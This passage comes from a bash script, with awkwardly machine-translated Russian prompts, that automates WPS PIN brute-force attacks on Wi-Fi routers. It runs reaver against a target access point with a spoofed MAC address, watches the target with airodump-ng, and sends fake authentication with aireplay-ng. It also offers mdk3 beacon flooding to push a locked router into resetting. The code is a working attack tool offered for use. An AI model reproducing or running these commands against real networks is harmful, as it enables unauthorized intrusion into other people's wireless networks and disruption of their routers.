echo -e "       или продолжаться в течение закрытии программы.$txtrst."

	read STARTR
	case $STARTR in
	r|R|e|E) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn !!!Неправильный ввод попробуйте снова !!!$txtrst"

		done



	if [ $STARTR == r ] || [ $STARTR == R ]; then
		killall -q Eterm &> /dev/null
                sleep .2
		killall -q mdk3 &> /dev/null
                sleep .2
		killall -q airodump-ng &> /dev/null
                sleep .2

	if [ $RCHOICE == n ]; then

		Eterm -g 80x10-1-70 --cmod "red" -T "reaver" -e sh  -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 -d 15 -T .5 --mac=$VARMAC; bash" &

		fi

	if [ $RCHOICE == y ]; then

		Eterm -g 80x10-1-70 --cmod "red" -T "reaver -r $RX:$RY" -e sh  -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 -d 15 -T .5 -r $RX:$RY --mac=$VARMAC; bash" &

		fi


#		Eterm -g 80x10-1-70 --cmod "red" -T "reaver" -e sh  -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 --mac=$VARMAC; bash" &
		echo""
		sleep 1

		Eterm -g 80x10+1-70 --cmod "red" -T "Airodump-ng" -e sh  -c "airodump-ng -c $CHANNEL --bssid $TARGETAP $MON; bash" &
		echo ""

		Eterm -g 80x10-1-300 --cmod "red" -T "Aireplay-ng" -e sh  -c "aireplay-ng -1 120 -a $TARGETAP $MON; bash" &
		echo ""

	clear
	while true
	do
                echo -e "$info  Если ривер оленья кожа соратник АП и / или цели АП не видел"
		echo -e "     в Airodump-нг, целевой АР может измениться каналы !!!"
                echo -e "$inp       тип $yel(r/R)$inp повторное сканирование с Airodump-нг или"
                echo -e "         тип $yel(c/C)$inp пропустить и продолжать .... $txtrst"

		read RESCAN
		case $RESCAN in
		r|R|c|C) break ;;
		~|~~)
		echo Aborting -
		exit
		;;

		esac
		echo -e  "$warn !!!Неправильный ввод попробуйте снова !!!$txtrst"

			done





		if [ $RESCAN == r ] || [ $RESCAN == R ]; then
			killall -q reaver &> /dev/null
			sleep .2
			killall -q airodump-ng &> /dev/null
			sleep .2
			killall -q aireplay-ng &> /dev/null
			sleep .2
			killall -q Eterm &> /dev/null
			Eterm -g 80x50-1-70 --cmod "red" -T "Airodump-ng" -e sh  -c "airodump-ng $MON; bash" &

	clear
	while true
	do
	echo ""
			echo -e "$q  Если вы хотите, чтобы перезагрузить reaver тип $yel(r/R)$q,or тип $yel(c/C)$q Пропустить.$txtrst"

	read RESREV
	case $RESREV in
	r|R|c|C) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn !!!Неправильный ввод попробуйте снова !!!$txtrst"

		done


clear

			
				if [ $RESREV == r ] || [ $RESREV == R ]; then

				while true
				do
				echo -e "$inp  Введите канал целевых AP.$txtrst"

				read CHANNEL
				case $CHANNEL in
    				1|2|3|4|5|6|7|8|9|10|11|12|13|14) break ;;
    				~|~~)
    				echo Aborting -
    				exit
     				;;

				esac
				echo -e  "$warn !!!Неправильный ввод попробуйте снова !!!$txtrst"

					done

sleep 2

				killall -q airodump-ng &> /dev/null

				#Eterm -g 80x10-1-70 --cmod "red" -T "reaver" -e sh  -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 --mac=$VARMAC; bash" &

sleep 1

	if [ $RCHOICE == n ]; then

		Eterm -g 80x10-1-70 --cmod "red" -T "reaver" -e sh  -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 -d 15 -T .5 --mac=$VARMAC; bash" &

		fi

	if [ $RCHOICE == y ]; then

		Eterm -g 80x10-1-70 --cmod "red" -T "reaver -r $RX:$RY" -e sh  -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 -d 15 -T .5 -r $RX:$RY --mac=$VARMAC; bash" &

		fi


		Eterm -g 80x10+1-70 --cmod "red" -T "Airodump-ng" -e sh  -c "airodump-ng -c $CHANNEL --bssid $TARGETAP $MON; bash" &
		echo ""	


		Eterm -g 80x10-1-300 --cmod "red" -T "Aireplay-ng" -e sh  -c "aireplay-ng -1 120 -a $TARGETAP $MON; bash" &
				
		fi

			fi

				fi

clear
while true
do
echo ""
echo -e "$inp Если WPS замок существует, тип $yel(c/C)$inp сбросить маршрутизатор или тип $yel(e/E)$inp до конца программы.$txtrst"

	read STARTR
	case $STARTR in
	c|C|e|E) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn !!!Неправильный ввод попробуйте снова !!!$txtrst"

		done


	if [ $STARTR == c ] || [ $STARTR == C ]; then


		clear
		while true
		do
		echo ""

		echo -e $q  "Вы хотите, чтобы добавить или продолжать использовать Beacon режим Flood?"
		echo -e $inp     "Тип $yel(y/Y)$inp для да или $yel(n/N)$inp для нет.$txtrst" #(BFM)
		read BFM
		case $BFM in
		y|Y|n|N) break ;;
		~|~~)
		echo Aborting -
		exit
		;;

		esac
		echo -e  "$warn !!!Неправильный ввод попробуйте снова !!!$txtrst"

			done


		fi		

killall -q reaver &> /dev/null
sleep .2
killall -q airodump-ng &> /dev/null
sleep .2
killall -q aireplay-ng &> /dev/null
sleep .2
killall -q mdk3 &> /dev/null
sleep .2
killall -q Eterm &> /dev/null


	done


		fi #if [ $AUTOMAN == m ] || [ $AUTOMAN == M ]; than


clear
sleep 3
while true

do
echo ""
echo ""
echo ""
echo -e "$warn  ####################################################"
echo -e "$warn  #$inp Press y to remove Eterm pages and clear program! #"
echo -e "$warn  ####################################################$txtrst"
echo ""
echo ""

  read CONFIRM
  case $CONFIRM in
    y|Y|YES|yes|Yes) break ;;
    #n|N|no|NO|No)
    #echo Aborting - you entered $CONFIRM
    #exit
    #  ;;

	esac

		done

killall -q Eterm &> /dev/null
killall -q mdk3 &> /dev/null
killall -q airodump-ng &> /dev/null
killall -q aireplay-ng &> /dev/null
killall -q reaver &> /dev/null

echo -e "$info  Это был мушкет команды - Сотрудничество Soxrox2212."
echo -e "$info     Принесите в поле зрения то, что скрыто."
echo -e "$info       Завершение программы.$warn.$txtrst.$warn.$txtrst.$warn.$txtrst.$info.....$txtrst"

sleep 7